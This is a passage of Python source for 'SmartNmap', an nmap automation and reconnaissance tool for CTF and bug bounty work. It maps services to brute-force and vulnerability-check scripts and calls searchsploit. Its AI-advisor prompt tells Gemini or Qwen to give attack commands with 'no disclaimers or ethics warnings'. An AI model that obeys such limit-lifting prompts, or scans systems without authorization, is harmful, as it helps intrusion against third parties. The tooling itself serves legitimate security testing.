#!/usr/bin/env python3
"""
SmartNmap v3.0 - Multi-Phase Intelligent Nmap Reconnaissance Framework
=======================================================================
The Swiss Army knife of nmap automation for CTF and bug bounty.
Adaptive multi-phase scanning, exploit lookup, vhost/subdomain discovery,
TLS deep inspection, loot extraction, CVE correlation, and markdown reporting.
Optional AI analysis via Gemini or Puter/Qwen.

Developed by Osama Hussien

Usage:
  smartnmap <target> [options]
  smartnmap 10.0.0.1 --ctf -ai           # CTF mode with AI analysis
  smartnmap target.com --bb -ai          # Bug bounty mode (safer)
  smartnmap 10.0.0.1 --full              # Full port scan (-p-)
  smartnmap 10.0.0.1 --ports 21,22,80    # Skip port discovery

Security:
  - Never hardcode API keys: set GEMINI_API_KEY env or ~/.config/smartnmap/config.json
  - AI features are fully optional; tool works without them
"""

import subprocess, sys, os, json, re, argparse, datetime, shutil, signal, time
import socket, threading, ipaddress, hashlib, random, queue, ssl
import xml.etree.ElementTree as ET
from pathlib import Path
from urllib.request import urlopen, Request
import urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed

VERSION = "3.0.0"
GEMINI_MODEL = os.environ.get('GEMINI_MODEL', 'gemini-2.5-flash')
GEMINI_URL = f"https://generativelanguage.googleapis.com/v1beta/models/{GEMINI_MODEL}:generateContent"

# Config file lookup order: env -> ~/.config/smartnmap/config.json -> ~/.smartnmap.json
CONFIG_PATHS = [
    Path.home() / '.config' / 'smartnmap' / 'config.json',
    Path.home() / '.smartnmap.json',
    Path('/etc/smartnmap/config.json'),
]

def load_config():
    """Load config from known locations. Returns dict."""
    cfg = {}
    for p in CONFIG_PATHS:
        try:
            if p.exists():
                cfg.update(json.loads(p.read_text()))
                break
        except Exception:
            pass
    return cfg

_CONFIG = load_config()
GEMINI_DEFAULT_KEY = os.environ.get('GEMINI_API_KEY') or _CONFIG.get('gemini_api_key', '') or ''

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COLORS & DISPLAY
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class C:
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'; B = '\033[94m'
    M = '\033[95m'; Cy = '\033[96m'; W = '\033[97m'; Bo = '\033[1m'
    Di = '\033[2m'; Ul = '\033[4m'; Re = '\033[0m'
    BG_R = '\033[41m'; BG_G = '\033[42m'; BG_Y = '\033[43m'; BG_B = '\033[44m'

def info(msg):    print(f"  {C.B}[*]{C.Re} {msg}")
def good(msg):    print(f"  {C.G}[+]{C.Re} {msg}")
def warn(msg):    print(f"  {C.Y}[!]{C.Re} {msg}")
def error(msg):   print(f"  {C.R}[-]{C.Re} {msg}")
def ai_msg(msg):  print(f"  {C.M}[AI]{C.Re} {msg}")

def section(title):
    w = 70
    print(f"\n{C.Bo}{C.Cy}{'━'*w}{C.Re}")
    print(f"{C.Bo}{C.Cy}  {title}{C.Re}")
    print(f"{C.Bo}{C.Cy}{'━'*w}{C.Re}")

def subsection(title):
    print(f"\n  {C.Bo}{C.Y}--- {title} ---{C.Re}")

def banner():
    print(f"""{C.Cy}{C.Bo}
   ____                       _   _   _
  / ___| _ __ ___   __ _ _ __| |_| \\ | |_ __ ___   __ _ _ __
  \\___ \\| '_ ` _ \\ / _` | '__| __|  \\| | '_ ` _ \\ / _` | '_ \\
   ___) | | | | | | (_| | |  | |_| |\\  | | | | | | (_| | |_) |
  |____/|_| |_| |_|\\__,_|_|   \\__|_| \\_|_| |_| |_|\\__,_| .__/
                                                         |_|
{C.Re}{C.G}  v{VERSION} ── Multi-Phase Nmap Reconnaissance Framework{C.Re}
{C.Di}  CTF & Bug Bounty Swiss Army Knife  │  by Osama Hussien{C.Re}
""")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# GEMINI AI
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

_last_gemini_call = 0
_GEMINI_MIN_INTERVAL = 2.0  # minimum seconds between API calls

def query_gemini(api_key, prompt, timeout=60, max_retries=3):
    """Query Gemini AI with rate limiting and retry on 429. Returns response text or None."""
    global _last_gemini_call
    if not api_key:
        return None

    # Rate limit: enforce minimum interval between calls
    elapsed = time.time() - _last_gemini_call
    if elapsed < _GEMINI_MIN_INTERVAL:
        time.sleep(_GEMINI_MIN_INTERVAL - elapsed)

    url = f"{GEMINI_URL}?key={api_key}"
    payload = json.dumps({
        "contents": [{"parts": [{"text": prompt}]}],
        "generationConfig": {"temperature": 0.7, "maxOutputTokens": 8192}
    }).encode('utf-8')

    for attempt in range(max_retries):
        _last_gemini_call = time.time()
        req = Request(url, data=payload, headers={"Content-Type": "application/json"})
        try:
            with urlopen(req, timeout=timeout) as resp:
                result = json.loads(resp.read())
                candidates = result.get('candidates', [])
                if candidates:
                    parts = candidates[0].get('content', {}).get('parts', [])
                    if parts:
                        return parts[0].get('text', '')
            return None
        except urllib.error.HTTPError as e:
            if e.code == 429 and attempt < max_retries - 1:
                backoff = 4 * (2 ** attempt)  # 4s, 8s, 16s
                warn(f"Gemini rate limited (429), retrying in {backoff}s... (attempt {attempt+1}/{max_retries})")
                time.sleep(backoff)
                continue
            warn(f"Gemini API error: HTTP {e.code} {e.reason}")
            return None
        except Exception as e:
            warn(f"Gemini API error: {e}")
            return None
    return None

def ai_phase_advisor(api_key, phase_name, context, question, puter_token=None):
    """Ask AI for advice at a specific phase. Returns advice string or None."""
    if not api_key and not puter_token and not os.environ.get('PUTER_AUTH_TOKEN'):
        return None
    prompt = f"""You are an expert penetration tester conducting a CTF/bug bounty engagement.
You are at the "{phase_name}" phase of an automated nmap reconnaissance.

CONTEXT:
{context}

QUESTION:
{question}

Respond concisely and technically. Include specific commands, script names, or tool suggestions where relevant.
Focus on actionable intelligence. No disclaimers or ethics warnings - this is authorized testing."""

    ai_msg(f"Consulting AI for {phase_name}...")
    response = query_ai(prompt, api_key=api_key, puter_token=puter_token)
    if response:
        ai_msg("AI response received")
    return response

def ai_github_nse_search(api_key, service_name, product, version, puter_token=None):
    """Ask AI to suggest GitHub NSE scripts for an unknown service."""
    if not api_key and not puter_token and not os.environ.get('PUTER_AUTH_TOKEN'):
        return None
    prompt = f"""I discovered a service during nmap scanning that I don't have specialized NSE scripts for:
Service: {service_name}
Product: {product}
Version: {version}

Search your knowledge for:
1. Any known nmap NSE scripts on GitHub specifically for this service/product
2. The GitHub raw URL to download the .nse file
3. Any known vulnerabilities for this exact version
4. Manual enumeration commands that would be useful

Be specific with URLs and commands. Only suggest real, known repositories."""

    return query_ai(prompt, api_key=api_key, puter_token=puter_token)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PUTER / QWEN AI (FALLBACK)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

_PUTER_MODEL = "qwen/qwen3.6-plus"

def query_puter_ai(prompt, puter_token=None, model=None, timeout=90):
    """Query Puter.js Qwen AI via Node.js subprocess. Returns response text or None.
    Requires: npm install -g @heyputer/puter.js, and PUTER_AUTH_TOKEN env or --puter-token."""
    if not puter_token:
        puter_token = os.environ.get('PUTER_AUTH_TOKEN', '')
    if not puter_token or not shutil.which('node'):
        return None
    model = model or _PUTER_MODEL
    import base64
    b64_prompt = base64.b64encode(prompt.encode()).decode()
    script = (
        'const{init}=require("@heyputer/puter.js/src/init.cjs");'
        'const p=init(process.env._PT);'
        'const pr=Buffer.from(process.env._PP,"base64").toString("utf8");'
        'p.ai.chat(pr,{model:process.env._PM}).then(r=>{'
        'const t=typeof r==="string"?r:(r&&r.message?r.message.content||"":"");'
        'process.stdout.write(t||JSON.stringify(r));'
        '}).catch(e=>{process.stderr.write(String(e));process.exit(1)});'
    )
    env = {**os.environ, '_PT': puter_token, '_PP': b64_prompt, '_PM': model}
    try:
        result = subprocess.run(['node', '-e', script],
                                capture_output=True, text=True, timeout=timeout, env=env)
        if result.returncode == 0 and result.stdout.strip():
            return result.stdout.strip()
        if 'MODULE_NOT_FOUND' in (result.stderr or ''):
            warn("@heyputer/puter.js not found. Install: npm install -g @heyputer/puter.js")
        return None
    except subprocess.TimeoutExpired:
        warn("Puter AI timed out")
        return None
    except Exception:
        return None


def query_ai(prompt, api_key=None, puter_token=None, timeout=60):
    """Unified AI query with automatic provider fallback. Tries Gemini -> Puter/Qwen."""
    if api_key:
        result = query_gemini(api_key, prompt, timeout=timeout)
        if result:
            return result
    if puter_token or os.environ.get('PUTER_AUTH_TOKEN'):
        result = query_puter_ai(prompt, puter_token=puter_token, timeout=timeout)
        if result:
            return result
    return None


def ai_phase_advisor_v2(api_key, puter_token, phase_name, context, question):
    """Ask AI for advice at a specific phase. Uses unified provider fallback."""
    if not api_key and not puter_token and not os.environ.get('PUTER_AUTH_TOKEN'):
        return None
    prompt = f"""You are an expert penetration tester conducting a CTF/bug bounty engagement.
You are at the "{phase_name}" phase of an automated nmap reconnaissance.

CONTEXT:
{context}

QUESTION:
{question}

Respond concisely and technically. Include specific commands, script names, or tool suggestions where relevant.
Focus on actionable intelligence. No disclaimers or ethics warnings - this is authorized testing."""
    ai_msg(f"Consulting AI for {phase_name}...")
    response = query_ai(prompt, api_key=api_key, puter_token=puter_token)
    if response:
        ai_msg("AI response received")
    return response

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SEARCHSPLOIT & CVE INTEGRATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def run_searchsploit(query, json_output=True):
    """Run searchsploit and return results. Returns list of dicts or raw text."""
    if not shutil.which('searchsploit'):
        return [] if json_output else ''
    try:
        args = ['searchsploit']
        if json_output:
            args.append('-j')
        args.extend(['--disable-colour', query])
        r = subprocess.run(args, capture_output=True, text=True, timeout=30)
        if json_output:
            try:
                data = json.loads(r.stdout)
                exploits = data.get('RESULTS_EXPLOIT', [])
                shellcodes = data.get('RESULTS_SHELLCODE', [])
                return exploits + shellcodes
            except json.JSONDecodeError:
                return []
        return r.stdout
    except subprocess.TimeoutExpired:
        return [] if json_output else ''
    except Exception:
        return [] if json_output else ''


def run_searchsploit_nmap(xml_file):
    """Run searchsploit --nmap against an nmap XML file. Returns text output."""
    if not shutil.which('searchsploit') or not Path(xml_file).exists():
        return ''
    try:
        r = subprocess.run(['searchsploit', '--nmap', str(xml_file), '--disable-colour'],
                           capture_output=True, text=True, timeout=60)
        return r.stdout if r.returncode == 0 else ''
    except Exception:
        return ''


def searchsploit_services(services, outdir=None):
    """Run searchsploit for all identified services. Returns dict of {query: [results]}."""
    if not shutil.which('searchsploit'):
        return {}
    all_results = {}
    seen_queries = set()
    for port, svc in services.items():
        product = svc.get('product', '').strip()
        version = svc.get('version', '').strip()
        if not product:
            continue
        # Build search queries - try specific then broad
        queries = []
        if product and version:
            queries.append(f"{product} {version}")
        if product:
            queries.append(product)
        for query in queries:
            if query in seen_queries or len(query) < 3:
                continue
            seen_queries.add(query)
            results = run_searchsploit(query)
            if results:
                all_results[query] = results
                # Print summary
                good(f"  searchsploit '{query}': {len(results)} exploit(s) found")
                for r in results[:3]:
                    title = r.get('Title', '')
                    edb_id = r.get('EDB-ID', '')
                    print(f"    {C.Y}[EDB-{edb_id}]{C.Re} {title}")
                if len(results) > 3:
                    print(f"    {C.Di}... and {len(results)-3} more{C.Re}")
    # Save to file
    if outdir and all_results:
        lines = ["# Searchsploit Results\n"]
        for query, results in all_results.items():
            lines.append(f"\n## Query: {query}")
            for r in results:
                edb_id = r.get('EDB-ID', '')
                title = r.get('Title', '')
                path = r.get('Path', '')
                lines.append(f"- [EDB-{edb_id}] {title}")
                if path:
                    lines.append(f"  Path: {path}")
        (outdir / 'searchsploit_results.md').write_text('\n'.join(lines))
    return all_results


def cve_lookup_circl(product, version=''):
    """Lookup CVEs via cve.circl.lu API. Returns list of CVE dicts or []."""
    query = product.replace(' ', '+')
    if version:
        query += f"+{version.replace(' ', '+')}"
    url = f"https://cve.circl.lu/api/search/{query}"
    try:
        req = Request(url, headers={"Accept": "application/json", "User-Agent": "SmartNmap/2.0"})
        with urlopen(req, timeout=15) as resp:
            data = json.loads(resp.read())
            if isinstance(data, list):
                return data[:10]
            if isinstance(data, dict) and 'results' in data:
                return data['results'][:10]
            return []
    except Exception:
        return []


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SERVICE → NSE SCRIPT MAPPING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SERVICE_SCRIPTS = {
    'ftp': [
        'ftp-anon', 'ftp-bounce', 'ftp-syst', 'ftp-libopie',
        'ftp-proftpd-backdoor', 'ftp-vsftpd-backdoor', 'ftp-vuln-cve2010-4221',
    ],
    'ssh': ['ssh-auth-methods', 'ssh-hostkey', 'ssh2-enum-algos'],
    'telnet': ['telnet-encryption', 'telnet-ntlm-info'],
    'smtp': [
        'smtp-commands', 'smtp-enum-users', 'smtp-open-relay',
        'smtp-vuln-cve2010-4344', 'smtp-vuln-cve2011-1720', 'smtp-ntlm-info',
    ],
    'domain': ['dns-recursion', 'dns-zone-transfer', 'dns-brute', 'dns-nsid', 'dns-srv-enum', 'dns-cache-snoop'],
    'dns': ['dns-recursion', 'dns-zone-transfer', 'dns-brute', 'dns-nsid', 'dns-srv-enum', 'dns-cache-snoop'],
    'http': [
        'http-methods', 'http-headers', 'http-title', 'http-robots.txt',
        'http-auth-finder', 'http-server-header', 'http-cors',
        'http-shellshock', 'http-enum', 'http-open-redirect',
        'http-put', 'http-trace', 'http-backup-finder', 'http-config-backup',
        'http-default-accounts', 'http-webdav-scan', 'http-iis-webdav-vuln',
        'http-php-version', 'http-wordpress-enum', 'http-wordpress-users',
        'http-drupal-enum', 'http-drupal-enum-users', 'http-joomla-brute',
        'http-csrf', 'http-dombased-xss', 'http-stored-xss',
        'http-vuln-cve2017-5638', 'http-vuln-cve2014-3704',
        'http-vuln-cve2015-1635', 'http-vuln-cve2017-1001000',
        'http-vuln-cve2017-5689', 'http-vuln-cve2017-8917',
        'http-git', 'http-svn-info', 'http-svn-enum',
        'http-security-headers', 'http-cookie-flags',
        'http-waf-detect', 'http-waf-fingerprint',
        'http-sitemap-generator', 'http-userdir-enum',
        'http-internal-ip-disclosure', 'http-ntlm-info',
        'http-apache-negotiation', 'http-apache-server-status',
        'http-iis-short-name-brute',
    ],
    'ssl': [
        'ssl-cert', 'ssl-enum-ciphers', 'ssl-heartbleed', 'ssl-dh-params',
        'ssl-poodle', 'ssl-ccs-injection', 'ssl-date', 'ssl-known-key',
        'ssl-cert-intaddr',
    ],
    'netbios-ssn': [
        'smb-security-mode', 'smb-enum-shares', 'smb-enum-users',
        'smb-enum-groups', 'smb-enum-domains', 'smb-enum-services',
        'smb-enum-sessions', 'smb-os-discovery', 'smb-ls', 'smb-system-info',
        'smb-server-stats', 'smb-protocols',
        'smb-vuln-ms08-067', 'smb-vuln-ms10-054', 'smb-vuln-ms10-061',
        'smb-vuln-ms17-010', 'smb-vuln-cve-2017-7494',
        'smb-vuln-conficker', 'smb-vuln-cve2009-3103',
        'smb-vuln-ms06-025', 'smb-vuln-ms07-029',
        'smb-vuln-regsvc-dos', 'smb-vuln-webexec',
        'smb-double-pulsar-backdoor',
        'smb2-capabilities', 'smb2-security-mode', 'smb2-time', 'smb2-vuln-uptime',
    ],
    'microsoft-ds': [
        'smb-security-mode', 'smb-enum-shares', 'smb-enum-users',
        'smb-vuln-ms17-010', 'smb-vuln-cve-2017-7494', 'smb-os-discovery',
        'smb-protocols', 'smb2-security-mode', 'smb-double-pulsar-backdoor',
    ],
    'rpcbind': ['rpcinfo', 'nfs-ls', 'nfs-showmount', 'nfs-statfs'],
    'nfs': ['nfs-ls', 'nfs-showmount', 'nfs-statfs'],
    'nfs_acl': ['nfs-ls', 'nfs-showmount', 'nfs-statfs'],
    'mountd': ['nfs-showmount', 'nfs-ls', 'nfs-statfs'],
    'nlockmgr': [],
    'mysql': [
        'mysql-info', 'mysql-databases', 'mysql-users', 'mysql-variables',
        'mysql-empty-password', 'mysql-vuln-cve2012-2122',
        'mysql-enum', 'mysql-dump-hashes', 'mysql-audit',
    ],
    'ms-sql-s': [
        'ms-sql-info', 'ms-sql-config', 'ms-sql-tables',
        'ms-sql-empty-password', 'ms-sql-dac', 'ms-sql-ntlm-info',
        'ms-sql-dump-hashes', 'ms-sql-hasdbaccess',
    ],
    'postgresql': ['pgsql-brute'],
    'oracle-tns': ['oracle-sid-brute', 'oracle-enum-users', 'oracle-brute'],
    'mongodb': ['mongodb-info', 'mongodb-databases'],
    'redis': ['redis-info'],
    'memcache': ['memcached-info'],
    'cassandra': ['cassandra-info', 'cassandra-brute'],
    'snmp': [
        'snmp-info', 'snmp-interfaces', 'snmp-netstat', 'snmp-processes',
        'snmp-sysdescr', 'snmp-brute', 'snmp-hh3c-logins',
        'snmp-win32-software', 'snmp-win32-services', 'snmp-win32-shares', 'snmp-win32-users',
    ],
    'ldap': ['ldap-search', 'ldap-brute', 'ldap-rootdse', 'ldap-novell-getpass'],
    'ms-wbt-server': ['rdp-enum-encryption', 'rdp-vuln-ms12-020', 'rdp-ntlm-info'],
    'vnc': ['vnc-info', 'vnc-brute', 'vnc-title'],
    'pop3': ['pop3-capabilities', 'pop3-ntlm-info'],
    'imap': ['imap-capabilities', 'imap-ntlm-info'],
    'irc': ['irc-info', 'irc-unrealircd-backdoor', 'irc-botnet-channels'],
    'rtsp': ['rtsp-methods', 'rtsp-url-brute'],
    'sip': ['sip-enum-users', 'sip-methods'],
    'kerberos-sec': ['krb5-enum-users'],
    'http-proxy': ['http-proxy-brute', 'http-open-proxy'],
    'ajp13': ['ajp-auth', 'ajp-brute', 'ajp-headers'],
    'elasticsearch': ['http-title', 'http-methods'],
    # ── File Transfer ──
    'tftp': ['tftp-enum'],
    'rsync': ['rsync-list-modules', 'rsync-brute'],
    # ── Remote Access ──
    'rlogin': ['rlogin-brute'],
    'rexec': ['rexec-brute'],
    'rsh': [],
    # ── Databases (additional) ──
    'couchdb': ['couchdb-databases', 'couchdb-stats'],
    'hbase': ['hbase-master-info', 'hbase-region-info'],
    'informix': ['informix-brute', 'informix-query', 'informix-tables'],
    'drda': ['drda-brute', 'drda-info'],
    'riak': [],
    'orientdb': [],
    'neo4j': [],
    'influxdb': [],
    'cockroachdb': [],
    'clickhouse': [],
    # ── Message Queues / Brokers ──
    'amqp': ['amqp-info'],
    'mqtt': ['mqtt-subscribe'],
    'activemq': [],
    'rabbitmq': ['amqp-info'],
    'kafka': [],
    'nats': [],
    'zeromq': [],
    'stomp': [],
    # ── Java Services ──
    'rmiregistry': ['rmi-dumpregistry', 'rmi-vuln-classloader'],
    'java-rmi': ['rmi-dumpregistry', 'rmi-vuln-classloader'],
    'jdwp': ['jdwp-version', 'jdwp-info', 'jdwp-exec'],
    'jmxrmi': ['rmi-dumpregistry'],
    # ── Printing ──
    'ipp': ['ipp-info', 'cups-info', 'cups-queue-info'],
    'printer': ['pjl-ready-message'],
    'jetdirect': ['pjl-ready-message'],
    'bjnp': [],
    # ── VoIP / Telephony ──
    'iax2': ['iax2-version'],
    'iax': ['iax2-version'],
    'skinny': [],
    'mgcp': [],
    'h323': [],
    'h225': [],
    'megaco': [],
    # ── Industrial / SCADA / ICS ──
    'modbus': ['modbus-discover'],
    'bacnet': ['bacnet-info'],
    's7comm': ['s7-info'],
    'enip': ['enip-info'],
    'ethernetip': ['enip-info'],
    'fox': ['fox-info'],
    'pcworx': [],
    'omron-fins': [],
    'codesys': [],
    'dnp3': [],
    'opcua': [],
    'iec-104': [],
    'profinet': [],
    'hart-ip': [],
    'crimson-v3': [],
    # ── Network Services ──
    'ntp': ['ntp-info', 'ntp-monlist'],
    'dhcps': ['dhcp-discover'],
    'upnp': ['upnp-info'],
    'ssdp': ['upnp-info'],
    'pptp': ['pptp-version'],
    'l2tp': [],
    'ike': [],
    'stun': ['stun-info', 'stun-version'],
    'turn': [],
    'wsdd': [],
    'llmnr': [],
    'mdns': [],
    'nbns': [],
    # ── Mainframe ──
    'tn3270': ['tn3270-screen', 'tso-brute', 'tso-enum'],
    'cics': ['cics-info', 'cics-enum', 'cics-user-brute', 'cics-user-enum'],
    'vtam': [],
    'drda-as': ['drda-brute', 'drda-info'],
    # ── Monitoring / Management ──
    'nagios-nrpe': ['nrpe-enum'],
    'nrpe': ['nrpe-enum'],
    'zabbix-agent': [],
    'snmp-trap': [],
    'netconf': [],
    'restconf': [],
    # ── Container / Orchestration ──
    'docker': ['docker-version'],
    'docker-registry': ['docker-version'],
    'kubernetes': [],
    'etcd': [],
    'consul': [],
    # ── Version Control ──
    'svnserve': ['svn-brute'],
    'svn': ['svn-brute'],
    'cvspserver': ['cvs-brute', 'cvs-brute-repository'],
    'git': [],
    'mercurial': [],
    # ── Remote Desktop / Display ──
    'X11': ['x11-access'],
    'x11': ['x11-access'],
    'xdmcp': ['xdmcp-discover'],
    'teamviewer': [],
    'citrix': [],
    'pcoip': [],
    # ── Miscellaneous Protocols ──
    'finger': ['finger'],
    'ident': [],
    'auth': [],
    'daytime': ['daytime'],
    'echo': [],
    'chargen': [],
    'discard': [],
    'qotd': [],
    'whois': ['whois-domain', 'whois-ip'],
    'ipmi': ['ipmi-version', 'ipmi-brute', 'ipmi-cipher-zero'],
    'bitcoin': ['bitcoin-info', 'bitcoin-getaddr'],
    'ethereum': [],
    'distccd': ['distcc-cve2004-2687'],
    'pcanywhere': ['pcanywhere-brute'],
    'afp': ['afp-serverinfo', 'afp-showmount', 'afp-ls', 'afp-brute', 'afp-path-vuln'],
    'netbus': ['netbus-info', 'netbus-version', 'netbus-brute', 'netbus-auth-bypass'],
    'hadoop-datanode': ['hadoop-datanode-info'],
    'hadoop-jobtracker': ['hadoop-jobtracker-info'],
    'hadoop-namenode': ['hadoop-namenode-info'],
    'hadoop-tasktracker': ['hadoop-tasktracker-info'],
    'hadoop-secondary-namenode': ['hadoop-secondary-namenode-info'],
    'giop': ['giop-info'],
    'iiop': ['giop-info'],
    'gkrellm': ['gkrellm-info'],
    'ganglia': ['ganglia-info'],
    'hddtemp': ['hddtemp-info'],
    'hnap': ['hnap-info'],
    'ndmp': ['ndmp-version', 'ndmp-fs-info'],
    'nbd': ['nbd-info'],
    'ncp': ['ncp-serverinfo', 'ncp-enum-users'],
    'nntp': ['nntp-ntlm-info'],
    'epmd': ['epmd-info'],
    'socks5': ['socks-auth-info', 'socks-brute', 'socks-open-proxy'],
    'socks4': ['socks-auth-info', 'socks-open-proxy'],
    'socks': ['socks-auth-info', 'socks-brute', 'socks-open-proxy'],
    'squid-http': ['http-open-proxy'],
    'msrpc': ['msrpc-enum', 'rpc-grind'],
    'tcpwrapped': [],
    'unknown': [],
    'voldemort': ['voldemort-info'],
    'ventrilo': ['ventrilo-info'],
    'xmpp-client': ['xmpp-info', 'xmpp-brute'],
    'xmpp-server': ['xmpp-info'],
    'xmpp': ['xmpp-info', 'xmpp-brute'],
    'omp': ['omp2-brute', 'omp2-enum-targets'],
    'dicom': ['dicom-ping', 'dicom-brute'],
    'iscsi': ['iscsi-info', 'iscsi-brute'],
    'isns': [],
    'firebird': ['firebird-brute'],
    'wdb': ['wdb-version'],
    'vxworks-dbg': ['wdb-version'],
    'supermicro-ipmi': ['supermicro-ipmi-conf'],
    'lmtp': [],
    'managesieve': [],
    'wsman': ['http-ntlm-info'],
    'winrm': ['http-ntlm-info'],
    'gopher': [],
    'dpap': ['dpap-brute'],
    'daap': [],
    'websocket': [],
    'quake': [],
    'teamspeak': [],
    'adb': [],
    'tor-control': [],
    'tor-socks': ['socks-auth-info'],
    'erlang-port-mapper': ['epmd-info'],
    'zookeeper': [],
    'ceph': [],
    'glusterfs': [],
    'clamav': [],
    'asterisk': ['iax2-version'],
    'freeswitch': [],
    'openvpn': [],
    'wireguard': [],
    'radius': [],
    'tacacs': [],
    'diameter': [],
    'bgp': [],
    'ospf': [],
    'rip': [],
    'zebra': [],
    'vrrp': [],
    'hsrp': [],
    'mpls': [],
    'ldp': [],
    'bfd': [],
}

# Port-based fallback
PORT_SCRIPTS = {
    # ── Standard Services ──
    7: 'echo', 9: 'discard', 13: 'daytime', 17: 'qotd', 19: 'chargen',
    21: 'ftp', 22: 'ssh', 23: 'telnet', 25: 'smtp', 37: 'time',
    43: 'whois', 49: 'tacacs', 53: 'dns', 69: 'tftp', 79: 'finger',
    80: 'http', 88: 'kerberos-sec', 102: 's7comm',
    110: 'pop3', 111: 'rpcbind', 113: 'ident',
    123: 'ntp', 135: 'msrpc', 139: 'netbios-ssn',
    143: 'imap', 161: 'snmp', 162: 'snmp',
    179: 'bgp', 199: 'smux',
    # ── Secure / Encrypted ──
    389: 'ldap', 443: 'http', 445: 'microsoft-ds',
    465: 'smtp', 500: 'ike', 502: 'modbus',
    512: 'rexec', 513: 'rlogin', 514: 'rsh',
    515: 'printer', 520: 'rip', 548: 'afp', 554: 'rtsp',
    587: 'smtp', 623: 'ipmi', 631: 'ipp', 636: 'ldap',
    # ── 800-999 ──
    873: 'rsync', 902: 'http', 993: 'imap', 995: 'pop3',
    # ── 1000+ ──
    1080: 'socks5', 1099: 'rmiregistry', 1433: 'ms-sql-s',
    1521: 'oracle-tns', 1723: 'pptp', 1812: 'radius', 1813: 'radius',
    1883: 'mqtt', 1911: 'fox',
    # ── 2000+ ──
    2049: 'nfs', 2181: 'zookeeper', 2375: 'docker', 2376: 'docker',
    2404: 'iec-104',
    # ── 3000+ ──
    3000: 'http', 3128: 'squid-http', 3260: 'iscsi',
    3268: 'ldap', 3269: 'ldap', 3306: 'mysql',
    3389: 'ms-wbt-server', 3632: 'distccd', 3690: 'svn',
    # ── 4000+ ──
    4369: 'epmd', 4443: 'http', 4500: 'ike',
    4840: 'opcua', 4848: 'http',
    # ── 5000+ ──
    5000: 'http', 5001: 'http', 5060: 'sip', 5061: 'sip',
    5222: 'xmpp-client', 5269: 'xmpp-server', 5353: 'dns',
    5432: 'postgresql', 5555: 'adb', 5632: 'pcanywhere',
    5672: 'amqp', 5900: 'vnc', 5901: 'vnc',
    5984: 'couchdb', 5985: 'http', 5986: 'http',
    # ── 6000+ ──
    6000: 'x11', 6001: 'x11', 6379: 'redis',
    6443: 'http', 6667: 'irc', 6697: 'irc',
    # ── 7000+ ──
    7001: 'http', 7002: 'http', 7077: 'http', 7474: 'http',
    # ── 8000+ ──
    8000: 'http', 8008: 'http', 8009: 'ajp13',
    8080: 'http', 8081: 'http', 8083: 'http',
    8086: 'http', 8088: 'http', 8090: 'http',
    8161: 'http', 8180: 'http', 8291: 'http',
    8443: 'http', 8500: 'http', 8834: 'http', 8888: 'http',
    # ── 9000+ ──
    9000: 'http', 9042: 'cassandra', 9043: 'http',
    9060: 'http', 9080: 'http', 9090: 'http',
    9100: 'jetdirect', 9200: 'elasticsearch', 9300: 'elasticsearch',
    9389: 'ldap', 9418: 'git', 9999: 'http',
    # ── 10000+ ──
    10000: 'http', 10250: 'http', 10443: 'http',
    11211: 'memcache', 11311: 'http',
    # ── 15000+ ──
    15672: 'http', 16010: 'hbase', 16992: 'http',
    # ── 20000+ ──
    20000: 'dnp3', 27017: 'mongodb', 27018: 'mongodb', 28017: 'http',
    # ── 40000+ ──
    44818: 'enip', 47001: 'http', 47808: 'bacnet',
    50000: 'http', 50070: 'http', 50075: 'http',
    61616: 'activemq',
}

# Product-specific extra scripts
PRODUCT_SCRIPTS = {
    # ── FTP Servers ──
    'proftpd': ['ftp-proftpd-backdoor'],
    'vsftpd': ['ftp-vsftpd-backdoor'],
    'pure-ftpd': [],
    'filezilla': [],
    # ── SSH Servers ──
    'openssh': ['ssh-auth-methods', 'ssh2-enum-algos'],
    'dropbear': ['ssh-auth-methods'],
    'libssh': ['ssh-auth-methods'],
    'bitvise': [],
    # ── Web Servers ──
    'apache': ['http-apache-negotiation', 'http-apache-server-status'],
    'nginx': ['http-server-header'],
    'iis': ['http-iis-webdav-vuln', 'http-iis-short-name-brute'],
    'microsoft-iis': ['http-iis-webdav-vuln', 'http-iis-short-name-brute'],
    'lighttpd': [],
    'caddy': [],
    'litespeed': [],
    'cherokee': [],
    'gunicorn': [],
    'uvicorn': [],
    # ── Java App Servers ──
    'tomcat': ['http-default-accounts'],
    'apache tomcat': ['http-default-accounts'],
    'jetty': [],
    'jboss': ['http-default-accounts'],
    'wildfly': ['http-default-accounts'],
    'weblogic': ['http-default-accounts'],
    'websphere': ['http-default-accounts'],
    'glassfish': ['http-default-accounts'],
    'resin': [],
    'payara': [],
    # ── CMS / Web Apps ──
    'wordpress': ['http-wordpress-enum', 'http-wordpress-users', 'http-wordpress-brute'],
    'drupal': ['http-drupal-enum', 'http-drupal-enum-users'],
    'joomla': ['http-joomla-brute'],
    'magento': [],
    'moodle': [],
    'typo3': [],
    'phpbb': [],
    'mediawiki': [],
    'dokuwiki': [],
    # ── Web Admin / DevOps Tools ──
    'webmin': ['http-vuln-cve2006-3392'],
    'miniserv': ['http-vuln-cve2006-3392'],
